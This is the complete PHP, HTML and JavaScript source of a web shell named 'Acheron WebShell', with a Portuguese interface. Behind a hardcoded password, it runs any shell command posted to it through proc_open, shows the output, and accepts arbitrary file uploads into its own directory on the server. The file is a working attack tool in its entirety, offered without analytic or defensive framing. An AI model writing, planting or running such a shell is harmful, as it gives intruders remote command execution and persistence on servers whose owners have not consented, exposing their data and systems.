<?php
$password = '12345678';

session_start();
if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
		header('Location: ' . $_SERVER['PHP_SELF']);
		exit();
    } else {
        echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background-color:#1e1e1e;color:#d4d4d4;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}form{border:1px solid #333;padding:2rem;border-radius:8px;background-color:#252526;}input{background-color:#3c3c3c;color:#d4d4d4;border:1px solid #333;padding:10px;margin-right:10px;border-radius:4px;}input[type=submit]{cursor:pointer;background-color:#0e639c;}</style></head><body><form method="POST"><h2>Acheron WebShell</h2><input type="password" name="password" placeholder="Senha" autofocus/><input type="submit" value="Login"/></form></body></html>';
        exit;
    }
}

function executeCommand($command) {
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );

    $process = proc_open($command, $descriptorspec, $pipes, realpath('./'), array());

    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        $error_output = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        proc_close($process);

        $result = '';
        if (!empty($output)) {
            $result .= htmlspecialchars($output);
        }
        if (!empty($error_output)) {
            $result .= "<span style='color: #ff6b6b;'>" . htmlspecialchars($error_output) . "</span>";
        }
        return $result;
    }
    return "<span style='color: #ff6b6b;'>Falha ao executar proc_open. Verifique as permissões ou se a função está habilitada.</span>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        echo "<pre><span style='color: #569cd6;'>$> " . htmlspecialchars($command) . "</span>\n" . executeCommand($command) . "</pre>";
        exit;
    }

    if (isset($_FILES['file'])) {
        $uploadDirectory = __DIR__ . "/";
        $uploadFile = $uploadDirectory . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
            echo "<pre style='color: #4ec9b0;'>Upload de '" . htmlspecialchars(basename($uploadFile)) . "' realizado com sucesso.</pre>";
        } else {
            echo "<pre style='color: #ff6b6b;'>Falha ao realizar o upload.</pre>";
        }
        exit;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Acheron WebShell by Cyber Rasta</title>
    <style>
        :root {
            --background-color: #1e1e1e;
            --terminal-bg: #252526;
            --text-color: #cccccc;
            --green-accent: #6a9955;
            --neon-green: #39ff14;
            --blue-accent: #569cd6;
            --font: 'Consolas', 'Monaco', 'monospace';
        }
        body {
            background-color: var(--background-color);
            color: var(--text-color);
            font-family: var(--font);
            margin: 0;
            padding: 20px;
            cursor: none;
        }
        h1 {
            color: var(--green-accent);
            text-align: center;
            font-weight: normal;
        }
        #custom-cursor {
            position: fixed;
            width: 20px;
            height: 20px;
            border: 2px solid var(--neon-green);
            border-radius: 50%;
            box-shadow: 0 0 10px var(--neon-green), 0 0 20px var(--neon-green);
            pointer-events: none;
            transform: translate(-50%, -50%);
            transition: transform 0.1s ease-out;
            z-index: 9999;
            animation: neon-blink 1s infinite alternate;
        }
        @keyframes neon-blink {
            from { opacity: 1; box-shadow: 0 0 10px var(--neon-green), 0 0 20px var(--neon-green); }
            to { opacity: 0.7; box-shadow: 0 0 5px var(--neon-green), 0 0 10px var(--neon-green); }
        }
        .terminal {
            background-color: var(--terminal-bg);
            border: 1px solid #333;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
            max-width: 1000px;
            margin: 20px auto;
        }
        #output {
            padding: 15px;
            height: 50vh;
            overflow-y: auto;
            word-wrap: break-word;
        }
        #output pre {
            margin: 0;
            white-space: pre-wrap;
        }
        .input-area {
            display: flex;
            align-items: center;
            background-color: rgba(0,0,0,0.2);
            padding: 5px 15px;
            border-top: 1px solid #333;
            border-bottom-left-radius: 8px;
            border-bottom-right-radius: 8px;
        }
        .prompt {
            color: var(--blue-accent);
            font-weight: bold;
            margin-right: 8px;
        }
        #commandInput {
			width: 100%;
            flex-grow: 1;
            background-color: transparent;
            color: var(--text-color);
            border: none;
            outline: none;
            font-family: var(--font);
            font-size: 1em;
            caret-color: var(--neon-green);
        }
        .actions {
            display: flex;
            gap: 10px;
            margin-left: 15px;
        }
        .action-btn {
            background-color: #3c3c3c;
            color: var(--text-color);
            border: 1px solid #555;
            border-radius: 4px;
            padding: 8px 12px;
            font-family: var(--font);
            transition: background-color 0.2s;
            cursor: none;
        }
        .action-btn:hover {
            background-color: #4c4c4c;
        }
        ::-webkit-scrollbar { width: 10px; }
        ::-webkit-scrollbar-track { background: var(--terminal-bg); }
        ::-webkit-scrollbar-thumb { background: #555; border-radius: 5px;}
        ::-webkit-scrollbar-thumb:hover { background: #777; }
    </style>
</head>
<body>
    <div id="custom-cursor"></div>

    <h1>Acheron WebShell</h1>

    <div class="terminal">
        <div id="output"></div>
        <div class="input-area">
            <span class="prompt">$></span>
            <form id="commandForm" style="flex-grow: 1; margin: 0;">
                <input type="text" name="command" id="commandInput" placeholder="Digite um comando..." autofocus autocomplete="off"/>
            </form>
            <div class="actions">
                <form id="uploadForm" style="margin:0;">
                    <input type="file" name="file" id="fileInput" style="display: none;"/>
                    <button type="button" class="action-btn" onclick="document.getElementById('fileInput').click();">Upload</button>
                </form>
                <button id="clearBtn" class="action-btn">Limpar</button>
            </div>
        </div>
    </div>

    <script>
        const commandForm = document.getElementById('commandForm');
        const uploadForm = document.getElementById('uploadForm');
        const commandInput = document.getElementById('commandInput');
        const fileInput = document.getElementById('fileInput');
        const outputDiv = document.getElementById('output');
        const clearBtn = document.getElementById('clearBtn');
        const customCursor = document.getElementById('custom-cursor');

        window.addEventListener('mousemove', e => {
            customCursor.style.left = e.clientX + 'px';
            customCursor.style.top = e.clientY + 'px';
        });

        const commandHistory = [];
        let historyIndex = -1;

        function appendToOutput(html) {
            outputDiv.innerHTML += html;
            outputDiv.scrollTop = outputDiv.scrollHeight;
        }

        commandForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const command = commandInput.value.trim();
            if (command === '') return;
            commandHistory.unshift(command);
            historyIndex = -1;
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    appendToOutput(xhr.responseText);
                } else {
                    appendToOutput('<pre style="color: red;">Erro na requisição AJAX.</pre>');
                }
            };
            xhr.send('command=' + encodeURIComponent(command));
            commandInput.value = '';
        });

        fileInput.addEventListener('change', function() {
            if (fileInput.files.length === 0) return;
            const formData = new FormData();
            formData.append('file', fileInput.files[0]);
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    appendToOutput(xhr.responseText);
                } else {
                    appendToOutput('<pre style="color: red;">Erro no upload via AJAX.</pre>');
                }
                uploadForm.reset();
            };
            xhr.send(formData);
        });
        
        clearBtn.addEventListener('click', function() {
            outputDiv.innerHTML = '';
        });

        commandInput.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    commandInput.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    commandInput.value = commandHistory[historyIndex];
                } else {
                    historyIndex = -1;
                    commandInput.value = '';
                }
            }
        });
    </script>
</body>
</html>